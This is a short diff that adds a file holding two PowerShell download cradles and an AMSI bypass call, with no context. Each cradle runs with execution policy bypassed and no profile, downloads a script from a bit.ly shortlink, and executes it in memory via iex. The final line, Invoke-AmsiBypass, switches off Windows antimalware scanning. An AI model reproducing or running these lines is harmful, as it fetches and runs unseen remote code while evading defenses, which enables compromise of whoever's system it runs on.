@@ -1,0 +1,5 @@
+powershell.exe –ep bypass –nop –noex –c iex (New-Object System.Net.WebClient).DownloadString('https://bit.ly/2L29o2V')
+
+
+powershell.exe –ep bypass –nop –noex –c iex (New-Object System.Net.WebClient).DownloadString('https://bit.ly/2jZlKwi')
+Invoke-AmsiBypass
